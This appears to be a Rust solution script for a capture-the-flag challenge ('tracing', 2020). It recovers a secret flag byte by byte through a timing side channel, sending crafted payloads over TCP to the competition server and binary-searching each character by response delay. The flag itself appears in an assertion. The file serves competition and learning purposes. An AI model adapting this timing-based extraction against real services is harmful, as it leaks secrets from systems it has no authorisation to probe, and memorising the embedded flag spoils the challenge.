use itertools::Itertools;
use std::cmp::Ordering;
use std::cmp::Ordering::{Equal, Greater, Less};
use std::error::Error;
use std::iter::Iterator;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::join;
use tokio::net::TcpStream;
use tokio::time::delay_for;

fn create_payload(known: &[u8], i: u8) -> Vec<[u8; 16]> {
    (0..=0xff)
        .cartesian_product(0..=0x2f)
        .map(|(l, r)| {
            let mut res = [0u8; 16];
            res[0..known.len()].clone_from_slice(&known[..]);
            res[known.len()] = i;
            res[known.len() + 1] = l;
            res[known.len() + 2] = r;
            res
        })
        .collect::<Vec<[u8; 16]>>()
}

async fn attack(entries: Vec<[u8; 16]>) -> Result<Duration, Box<dyn Error>> {
    let mut total = Duration::new(0, 0);
    let mut tasks = Vec::new();

    let NUM_TRIES: u8 = 3;

    for _ in 0..NUM_TRIES {
        let entries = entries.clone();
        tasks.push(tokio::spawn(async move {
            let (mut read, mut write) = TcpStream::connect("tracing.2020.ctfcompetition.com:1337")
                // let (mut read, mut write) = TcpStream::connect("localhost:1337")
                .await
                .unwrap()
                .into_split();
            for e in &entries {
                write.write_all(e).await.unwrap();
            }

            let mut resp = Vec::new();
            write.flush().await.unwrap();
            delay_for(Duration::new(10, 0)).await;
            write.shutdown().await.unwrap();
            let mut buf = [0; 4];
            read.read(&mut buf).await.unwrap();
            let start = Instant::now();
            read.read_to_end(&mut resp).await.unwrap();
            let elapsed = start.elapsed();


            assert_eq!(entries.len() as u32, u32::from_be_bytes(buf));
            elapsed
        }));
    }

    for task in tasks {
        total += task.await?;
    }

    Ok(total / NUM_TRIES as u32)
}

async fn discover_next(known: &[u8]) -> Result<u8, Box<dyn Error>> {
    let time_low = Duration::from_millis(10);

    let mut first = 0;
    let mut it = 0;
    let mut step = 0;
    let mut count = 255;
    while count > 0 {
        it = first;
        step = count / 2;
        it += step;
        let duration = {
            let mut curr = Duration::from_millis(0);
            loop {
                let temp = attack(create_payload(known, it)).await;
                if temp.is_ok() {
                    curr = temp.unwrap();
                    break;
                }
            }
            curr
        };
        if duration > time_low {
            it += 1;
            first = it;
            count -= step + 1
        } else {
            count = step;
        }
        println!("{} - {} - {:?}", it, step, duration);
    }
    it -= 1;
    Ok(it)
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let mut flag: Vec<u8> = "".bytes().collect();
    // can't consistently crack the last two chars because there isn't space to make long binary tree branches
    // the last char is known to be } because of the flag format but the second to last char just needs to be guessed
    // it was pretty obviously e from the pattern
    for _ in 0..14 {
        let next = discover_next(&flag).await?;
        flag.push(next);
        println!("flag thus far: {}", String::from_utf8_lossy(&flag));
    }
    assert_eq!( String::from_utf8_lossy(&flag) + "e}", "CTF{1BitAtATime}");
    Ok(())
}
